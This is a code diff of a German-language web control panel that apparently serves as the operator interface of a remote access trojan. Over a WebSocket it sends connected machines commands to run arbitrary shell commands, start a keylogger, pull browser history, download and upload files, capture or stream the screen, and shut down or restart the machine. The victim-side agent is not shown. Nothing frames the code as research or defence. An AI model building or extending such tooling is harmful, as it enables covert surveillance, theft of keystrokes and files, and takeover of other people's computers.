-        if (e.key === "Enter") sendCommand();
-      });
-      btnSysteminfo.onclick = () => sendCommand({ action: "systeminfo" });
-      btnLs.onclick = () => {
-        const dir = prompt("Verzeichnis auflisten (leer für aktuelles):", ".");
-        sendCommand({ action: "ls", path: dir || "." });
-      };
-      btnShutdown.onclick = () => {
-        if (confirm("Client wirklich herunterfahren?")) sendCommand({ action: "shutdown" });
-      };
-      btnRestart.onclick = () => {
-        if (confirm("Client wirklich neustarten?")) sendCommand({ action: "restart" });
-      };
-      btnUpload.onclick = () => uploadInput.click();
-      uploadInput.onchange = () => {
-        if (!selectedClientId) {
-          log("Kein Client ausgewählt.", "error");
-          return;
+    });
+    commandInput.addEventListener("keydown", (e) => {
+      if (!suggestActive) return;
+      if (e.key === "ArrowDown") {
+        suggestIndex = (suggestIndex + 1) % suggestItems.length;
+        showSuggest(suggestItems);
+        e.preventDefault();
+      } else if (e.key === "ArrowUp") {
+        suggestIndex = (suggestIndex - 1 + suggestItems.length) % suggestItems.length;
+        showSuggest(suggestItems);
+        e.preventDefault();
+      } else if (e.key === "Enter") {
+        if (suggestActive && suggestItems.length) {
+          selectSuggest(suggestIndex, suggestItems);
+          e.preventDefault();
         }
-        const file = uploadInput.files[0];
-        if (!file) return;
-        const reader = new FileReader();
-        reader.onload = function (e) {
-          const dataB64 = btoa(
-            new Uint8Array(e.target.result)
-              .reduce((data, byte) => data + String.fromCharCode(byte), "")
-          );
-          ws.send(
-            JSON.stringify({
-              target_id: selectedClientId,
-              action: "upload",
-              filename: file.name,
-              data: dataB64,
-            })
-          );
-          log(`Datei-Upload gesendet: ${file.name}`, "cmd");
-        };
-        reader.readAsArrayBuffer(file);
-      };
+      } else if (e.key === "Escape") {
+        hideSuggest();
+      }
+    });
+    commandInput.addEventListener("blur", () => {
+      setTimeout(hideSuggest, 100);
+    });
 
-      btnScreenStart.onclick = () => {
-        if (!selectedClient) {
-          screenStatus.textContent = 'Kein Client ausgewählt!';
-          return;
+    // --- Live Screen Anzeige nur bei Command ---
+    const liveScreenArea = document.getElementById('live-screen-area');
+    let liveScreenActive = false;
+    function handleLiveScreenCommand(cmd) {
+      if (cmd === "/screenstream_start") {
+        liveScreenArea.style.display = "";
+        liveScreenActive = true;
+        debugLog("Live-Screen Panel aktiviert", "info");
+      } else if (cmd === "/screenstream_stop") {
+        liveScreenArea.style.display = "none";
+        liveScreenActive = false;
+        const ctx = document.getElementById('screen-canvas').getContext('2d');
+        ctx.clearRect(0, 0, 9999, 9999);
+        document.getElementById('screen-status').textContent = '';
+        debugLog("Live-Screen Panel deaktiviert", "info");
+      }
+    }
+
+    // --- Befehl senden (nur Senden-Button bleibt) ---
+    function sendCommand(customPayload = null) {
+      if (!selectedClientId) {
+        log("Fehler: Kein Client ausgewählt.", "error");
+        debugLog("Kein Client ausgewählt beim Senden", "warn");
+        return;
+      }
+      let payload;
+      if (customPayload) {
+        payload = { target_id: selectedClientId, ...customPayload };
+      } else {
+        const commandText = commandInput.value.trim();
+        if (!commandText) return;
+        if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
+        if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
+        let slashPayload = parseSlashCommand(commandText);
+        if (slashPayload) {
+          payload = { target_id: selectedClientId, ...slashPayload };
+        } else {
+          const parts = commandText.split(" ");
+          const action = parts[0].toLowerCase();
+          const argument = parts.slice(1).join(" ");
+          payload = {
+            target_id: selectedClientId,
+            action: action,
+          };
+          if (action === "screenstream_start") handleLiveScreenCommand("/screenstream_start");
+          if (action === "screenstream_stop") handleLiveScreenCommand("/screenstream_stop");
+          switch (action) {
+            case "exec":
+              payload.command = argument;
+              break;
+            case "download":
+              payload.path = argument;
+              break;
+            case "history":
+              payload.limit = parseInt(argument) || 20;
+              break;
+            case "keylogger":
+              payload.count = parseInt(argument) || 50;
+              break;
+            case "ls":
+              payload.path = argument || ".";
+              break;
+            case "screenshot":
+            case "systeminfo":
+            case "shutdown":
+            case "restart":
+              break;
+            default:
+              log(
+                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
+                "error"
+              );
+              debugLog("Unbekannter Befehl: " + action, "warn");
+              return;
+          }
         }
-        ws.send(JSON.stringify({action:'screenstream_start',client_id:selectedClient}));
-        screenStatus.textContent = 'Live-Screen wird angefordert...';
-      };
-      btnScreenStop.onclick = () => {
-        if (!selectedClient) {
-          screenStatus.textContent = 'Kein Client ausgewählt!';
-          return;
-        }
-        ws.send(JSON.stringify({action:'screenstream_stop',client_id:selectedClient}));
-        screenStatus.textContent = 'Live-Screen gestoppt.';
-        screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
-      };
+      }
+      ws.send(JSON.stringify(payload));
+      log(
+        `Befehl gesendet: ${payload.action}${
+          payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
+        }`,
+        "cmd"
+      );
+      debugLog("Befehl gesendet: " + JSON.stringify(payload), "info");
+      commandInput.value = "";
+      hideSuggest();
+    }
 
-      // --- WebSocket Events ---
-      ws.onopen = () => log("Verbunden mit dem Control Server.");
-      ws.onclose = () => log("Verbindung zum Control Server verloren.", "error");
-      ws.onerror = (err) => log(`WebSocket Fehler: ${err}`, "error");
-
-      ws.onmessage = (event) => {
+    // --- WebSocket Events ---
+    const ws = new WebSocket(`wss://${window.location.host}/ws`);
+    const clientList = document.getElementById("client-list");
+    let selectedClientId = null;
+    let selectedClient = null;
+    ws.onopen = () => { log("Verbunden mit dem Control Server."); debugLog("WebSocket verbunden", "info"); };
+    ws.onclose = () => { log("Verbindung zum Control Server verloren.", "error"); debugLog("WebSocket geschlossen", "warn"); };
+    ws.onerror = (err) => { log(`WebSocket Fehler: ${err}`, "error"); debugLog("WebSocket Fehler: " + err, "error"); };
+    ws.onmessage = (event) => {
+      try {
         const data = JSON.parse(event.data);
+        debugLog("Empfangen: " + event.data, "info");
         switch (data.type) {
           case "client_list":
             renderClientList(data.clients);
@@ -651,52 +699,145 @@
             break;
           case "error":
             log(`[Server/Client Fehler] ${data.message || data.error}`, "error");
+            debugLog("Server/Client Fehler: " + (data.message || data.error), "error");
             break;
         }
         // Live-Screen-Frame
-        if (data.action === 'screen_frame' && data.client_id === selectedClient) {
+        if (data.action === 'screen_frame' && data.client_id === selectedClient && liveScreenActive) {
           if (data.img_bytes && data.width && data.height) {
             drawScreenFrame(data.img_bytes, data.width, data.height);
           }
         }
+      } catch (err) {
+        debugLog("Fehler beim Parsen der Nachricht: " + err, "error");
+      }
+    };
+
+    // --- Theme Toggle ---
+    const themeToggle = document.getElementById('theme-toggle');
+    themeToggle.onclick = () => {
+      const isLight = document.documentElement.getAttribute('data-theme') === 'light';
+      document.documentElement.setAttribute('data-theme', isLight ? 'dark' : 'light');
+      themeToggle.textContent = isLight ? '🌙' : '☀️';
+    };
+
+    // --- Live Screenstream mit Canvas, Zoom, Screenshot ---
+    const screenCanvas = document.getElementById('screen-canvas');
+    const screenStatus = document.getElementById('screen-status');
+    const screenZoom = document.getElementById('screen-zoom');
+    const screenScreenshot = document.getElementById('screen-screenshot');
+    let lastScreenTime = 0, lastScreenFps = 0, lastScreenWidth = 0, lastScreenHeight = 0;
+
+    function drawScreenFrame(imgBytes, width, height) {
+      const ctx = screenCanvas.getContext('2d');
+      const img = new window.Image();
+      img.onload = function() {
+        lastScreenWidth = width;
+        lastScreenHeight = height;
+        let zoom = screenZoom.value === "fit"
+          ? Math.min(screenCanvas.parentElement.offsetWidth / width, 1)
+          : Number(screenZoom.value);
+        screenCanvas.width = width * zoom;
+        screenCanvas.height = height * zoom;
+        ctx.clearRect(0, 0, screenCanvas.width, screenCanvas.height);
+        ctx.drawImage(img, 0, 0, screenCanvas.width, screenCanvas.height);
+        // FPS berechnen
+        const now = performance.now();
+        if (lastScreenTime) {
+          lastScreenFps = Math.round(1000 / (now - lastScreenTime));
+        }
+        lastScreenTime = now;
+        screenStatus.textContent = `Livebild (${width}x${height}) – FPS: ${lastScreenFps}`;
       };
-
-      // Modernisierte Client-Liste
-      function createClientListItem(client) {
-        const li = document.createElement("li");
-        li.innerHTML = `<span class="client-status-dot"></span>
-          <span>${client.hostname || "Unbekannt"}</span>
-          <span style="margin-left:auto;font-size:0.97em;color:#b9bbbe;">${client.ip || client.address[0]}</span>`;
-        li.dataset.clientId = client.id;
-        li.title = `Hostname: ${client.hostname || "?"}\nOS: ${client.os || "?"}\nIP: ${client.ip || client.address[0]}`;
-        if (client.id === selectedClientId) li.classList.add("selected");
-        li.addEventListener("click", () => selectClient(client.id, client));
-        return li;
-      }
-
-      // Live Screenstream mit Canvas
-      const screenCanvas = document.getElementById('screen-canvas');
-      const screenStatus = document.getElementById('screen-status');
-      let lastScreenTime = 0, lastScreenFps = 0;
-
-      function drawScreenFrame(imgBytes, width, height) {
+      img.src = "data:image/jpeg;base64," + imgBytes;
+    }
+    screenZoom.onchange = () => {
+      if (lastScreenWidth && lastScreenHeight) {
+        // Redraw last frame with new zoom
         const ctx = screenCanvas.getContext('2d');
-        const img = new window.Image();
-        img.onload = function() {
-          screenCanvas.width = width;
-          screenCanvas.height = height;
-          ctx.clearRect(0, 0, width, height);
-          ctx.drawImage(img, 0, 0, width, height);
-          // FPS berechnen
-          const now = performance.now();
-          if (lastScreenTime) {
-            lastScreenFps = Math.round(1000 / (now - lastScreenTime));
-          }
-          lastScreenTime = now;
-          screenStatus.textContent = `Livebild (${width}x${height}) – FPS: ${lastScreenFps}`;
-        };
-        img.src = "data:image/jpeg;base64," + imgBytes;
+        const imgData = ctx.getImageData(0, 0, screenCanvas.width, screenCanvas.height);
+        drawScreenFrame(ctx.canvas.toDataURL("image/jpeg").split(",")[1], lastScreenWidth, lastScreenHeight);
       }
-    </script>
-  </body>
+    };
+    screenScreenshot.onclick = () => {
+      if (!lastScreenWidth || !lastScreenHeight) return;
+      const link = document.createElement("a");
+      link.href = screenCanvas.toDataURL("image/png");
+      link.download = `screenshot_${Date.now()}.png`;
+      link.click();
+    };
+    screenCanvas.onclick = () => {
+      if (!lastScreenWidth || !lastScreenHeight) return;
+      if (screenZoom.value === "fit") {
+        screenZoom.value = "1";
+      } else if (screenZoom.value === "1") {
+        screenZoom.value = "2";
+      } else {
+        screenZoom.value = "fit";
+      }
+      screenZoom.onchange();
+    };
+
+    // --- Event-Handler ---
+    sendButton.addEventListener("click", sendCommand);
+    commandInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") sendCommand();
+    });
+    btnSysteminfo.onclick = () => sendCommand({ action: "systeminfo" });
+    btnLs.onclick = () => {
+      const dir = prompt("Verzeichnis auflisten (leer für aktuelles):", ".");
+      sendCommand({ action: "ls", path: dir || "." });
+    };
+    btnShutdown.onclick = () => {
+      if (confirm("Client wirklich herunterfahren?")) sendCommand({ action: "shutdown" });
+    };
+    btnRestart.onclick = () => {
+      if (confirm("Client wirklich neustarten?")) sendCommand({ action: "restart" });
+    };
+    btnUpload.onclick = () => uploadInput.click();
+    uploadInput.onchange = () => {
+      if (!selectedClientId) {
+        log("Kein Client ausgewählt.", "error");
+        return;
+      }
+      const file = uploadInput.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = function (e) {
+        const dataB64 = btoa(
+          new Uint8Array(e.target.result)
+            .reduce((data, byte) => data + String.fromCharCode(byte), "")
+        );
+        ws.send(
+          JSON.stringify({
+            target_id: selectedClientId,
+            action: "upload",
+            filename: file.name,
+            data: dataB64,
+          })
+        );
+        log(`Datei-Upload gesendet: ${file.name}`, "cmd");
+      };
+      reader.readAsArrayBuffer(file);
+    };
+
+    btnScreenStart.onclick = () => {
+      if (!selectedClient) {
+        screenStatus.textContent = 'Kein Client ausgewählt!';
+        return;
+      }
+      ws.send(JSON.stringify({action:'screenstream_start',client_id:selectedClient}));
+      screenStatus.textContent = 'Live-Screen wird angefordert...';
+    };
+    btnScreenStop.onclick = () => {
+      if (!selectedClient) {
+        screenStatus.textContent = 'Kein Client ausgewählt!';
+        return;
+      }
+      ws.send(JSON.stringify({action:'screenstream_stop',client_id:selectedClient}));
+      screenStatus.textContent = 'Live-Screen gestoppt.';
+      screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
+    };
+  </script>
+</body>
 </html>
